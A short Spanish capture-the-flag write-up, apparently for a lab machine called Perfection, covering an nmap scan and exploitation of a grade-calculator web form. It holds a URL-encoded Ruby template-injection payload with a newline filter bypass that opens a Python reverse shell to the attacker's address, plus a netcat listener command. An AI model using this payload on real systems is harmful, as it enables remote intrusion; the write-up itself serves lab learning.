## Enumeration

Comenzaremos por un escaneo de puertos con nmap para ver que servicios tiene expuestos al exterior.

```bash
sudo nmap -p- -n -Pn --disable-arp-ping -sS -sV -sC -vvv -T5 10.10.11.253 -oN Perfection.nmap

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 nginx
```

Una vez escaneada la maquina vemos que tiene un servicio web corriendo por lo que entramos a la web y navegando por ella llegamos a lo que viene a ser un formularip para calcular la nota media de un alumno.

## Exploitation

Abrimos burpsuite, capturamos la petición y la mandamos al repeater.

Una vez ahi decido probar varios payloads para primero ver que caracteres esta filtrando y posteriormente intentar colar un revershell. Para realizar estas pruebas me baso en algunos payloads de [hacktricks] así como que la tecnologia que hay detras tiene pinta de ser Ruby. 

tras varios intentos, consigo RCE en la maquina cuelo una revershell mediante el siguiente payload en el campo de categoria:

```
category%0a<%25%3d+`python3+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect(("10.10.14.199",5000))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3bos.dup2(s.fileno(),2)%3bimport+pty%3b+pty.spawn("bash")'`+%25>
```

> Nota: El payload ya esta con el encode para url en los caracteres clave gracias a burpsuite.

```bash
nc -lvnp 5000
```
